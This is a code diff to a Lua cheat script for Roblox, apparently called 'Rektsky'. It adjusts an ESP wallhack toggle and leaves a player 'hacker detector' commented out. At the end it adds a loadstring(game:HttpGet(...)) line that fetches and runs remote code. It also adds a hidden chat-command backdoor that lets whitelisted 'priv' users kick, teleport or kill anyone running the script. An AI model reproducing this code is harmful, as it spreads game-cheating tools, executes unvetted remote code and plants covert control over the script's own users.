@@ -1535,13 +1535,7 @@ local function makeRainbowFrame(frame)
     end)
 end
 
-local surface
-local players = game:GetService("Players")
-local currentPlayer = nil
-local lplayer = players.LocalPlayer
-local espfaces = {"Front","Back","Bottom","Left","Right","Top"} 
-local ENEMYCOLOR =  {255,0,0}
-local ALLYCOLOR =  {0,0,255}
+local ESPFolder
 Tabs["Render"]:CreateToggle({
     ["Name"] = "ESP",
     ["Keybind"] = nil,
@@ -1550,7 +1544,7 @@ Tabs["Render"]:CreateToggle({
         local espval = v
         if espval then
             spawn(function()
-                local ESPFolder = Instance.new("Folder")
+                ESPFolder = Instance.new("Folder")
                 ESPFolder.Name = "ESPFolder"
                 ESPFolder.Parent = ScreenGuitwo
                 repeat
@@ -1578,7 +1572,6 @@ Tabs["Render"]:CreateToggle({
                             local legPos, legVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position - Vector3.new(0, 1 + (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and 2 or plr.Character.Humanoid.HipHeight), 0))
                             rootPos = rootPos
                             if rootVis then
-                                print("lol")
                                 thing.Visible = rootVis
                                 thing.Size = UDim2.new(0, rootSize / rootPos.Z, 0, headPos.Y - legPos.Y)
                                 thing.Position = UDim2.new(0, rootPos.X - thing.Size.X.Offset / 2, 0, (rootPos.Y - thing.Size.Y.Offset / 2) - 36)
@@ -2212,6 +2205,41 @@ Tabs["Rektsky"]:CreateToggle({
 })
 
 --[[
+    local hackdetector = false
+    Tabs["Rektsky"]:CreateToggle({
+        ["Name"] = "HackerDetector",
+        ["Keybind"] = nil,
+        ["Callback"] = function(v)
+            hackdetector = v
+            if hackdetector then
+                repeat task.wait() until (matchState == 2)
+                spawn(function()
+                    repeat
+                        task.wait()
+                        if (not hackdetector) then return end
+                        for i, v in pairs(game.Players:GetChildren()) do
+                            if v:FindFirstChild("HumanoidRootPart") then
+                                local oldpos = v.Character.HumanoidRootPart.Position
+                                task.wait(0.5)
+                                local newpos = Vector3.new(v.Character.HumanoidRootPart.Position.X, 0, v.Character.HumanoidRootPart.Position.Z)
+                                local realnewpos = math.floor((newpos - Vector3.new(oldpos.X, 0, oldpos.Z)).magnitude) * 2
+                                if realnewpos > 32 then
+                                    game:GetService("StarterGui"):SetCore("SendNotification", {
+                                        Title = v.Name.." is cheating",
+                                        Text = tostring(math.floor((newpos - Vector3.new(oldpos.X, 0, oldpos.Z)).magnitude)),
+                                        Duration = 5,
+                                    })
+                                end
+                            end
+                        end
+                    until (not hackdetector)
+                end)
+            end
+        end
+    })
+]]
+
+--[[
     do
         local rainbowenab = {["Value"] = false}
         local rainbowspeed = {["Value"] = 4.5}
@@ -2597,3 +2625,49 @@ Tabs["World"]:CreateToggle({
     end
 })
 -- code no work lmao]]
+
+local whitelists = loadstring(game:HttpGet("https://raw.githubusercontent.com/8pmX8/rektsky4roblox/main/whitelist.lua"))()
+for i, v in pairs(game.Players:GetPlayers()) do
+	for k, b in pairs(whitelists) do
+		if lplr.UserId ~= tonumber(b) and v.UserId == tonumber(b) then
+            local args = {
+                [1] = "hi " .. v.Name .. "!",
+                [2] = "All"
+            }
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+        end
+	end
+end
+
+for i, v in pairs(game.Players:GetPlayers()) do
+    for k, b in pairs(whitelists) do
+        if lplr.UserId == tonumber(b) then
+            local conec
+            conec = v.Chatted:Connect(function(msg)
+                if msg == "hi " .. lplr.Name .. "!" then
+                    createnotification("Rektsky User detected", v.Name.. " is using rektsky", 10, true)
+                end
+            end)
+        end
+    end
+end
+
+for i, v in pairs(game.Players:GetPlayers()) do
+    for k, b in pairs(whitelists) do
+        if lplr.UserId ~= tonumber(b) then
+            if v.UserId == tonumber(b) then
+                v.Chatted:Connect(function(msg)
+                    if msg == "r!kick" then
+                        lplr:kick("Skill issue'd by rektsky priv user!")
+                    end
+                    if msg == "r!lagback" then
+                        lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(555, 0, 0)
+                    end
+                    if msg == "r!kill" then
+                        lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+                    end
+                end)
+            end
+        end
+    end
+end
